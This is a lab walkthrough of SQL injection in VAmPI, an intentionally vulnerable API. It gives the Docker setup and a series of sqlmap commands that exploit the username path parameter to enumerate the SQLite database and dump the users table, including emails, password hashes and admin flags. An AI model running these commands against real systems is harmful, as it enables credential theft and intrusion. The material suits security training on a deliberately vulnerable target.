# 🔬 VAmPI Lab — SQL Injection Walkthrough

## 📋 Setup

### 📚 Repository
https://github.com/erev0s/VAmPI

### 🐳 Run It via Docker
```bash
docker run -p 5000:5000 erev0s/vampi:latest
```

---

## 🎯 Target Endpoint

```
http://<target-host>:5000/users/v1/<username>
```

## 📨 Example Request

```http
GET /users/v1/name1 HTTP/1.1
Host: <target-host>:5000
Accept: application/json
```

---

## 🔍 Why This Is Vulnerable

The `/users/v1/<username>` endpoint takes the username directly from the URL path and feeds it into a backend SQL query without sanitizing it first. That makes the path parameter itself injectable.

---

## 🛠️ Exploiting It With sqlmap

### 🔎 Confirm the Injection Point

```bash
sqlmap -u http://<target-host>:5000/users/v1/*name1*
```

The asterisk marks exactly where sqlmap should inject its test payloads — in this case, right where the username goes.

### 🗄️ Enumerate Available Databases

```bash
sqlmap -u http://<target-host>:5000/users/v1/*name1* --dbs
```

### 📊 List Tables

VAmPI runs on SQLite by default:

```bash
sqlmap -u http://<target-host>:5000/users/v1/*name1* -D SQLite --tables
```

### 📋 List Columns in the `users` Table

```bash
sqlmap -u http://<target-host>:5000/users/v1/*name1* -D SQLite -T users --columns
```

### 👥 Dump the Sensitive User Data

Pull out the columns that actually matter for an attacker — IDs, emails, usernames, password hashes, and the admin flag:

```bash
sqlmap -u http://<target-host>:5000/users/v1/*name1* -D SQLite -T users -C id,email,username,password,admin --dump
```

### 🔓 Dump Other Tables Too

Once you've confirmed the injection works, it's worth enumerating and dumping whatever other tables exist, to get a full picture of what's exposed:

```bash
sqlmap -u http://<target-host>:5000/users/v1/*name1* -D SQLite -T books --dump
```

---

## 🛡️ Why This Matters

This is a clean, minimal example of how a single unsanitized path parameter can completely expose an application's database — usernames, password hashes, admin flags, and anything else stored alongside them. It's a great lab to practice on precisely because the injection point is so obvious and the payoff (full user table dump) is so immediate, which makes it easy to see the real-world impact of skipping input validation on something as "harmless-looking" as a username in a URL path.
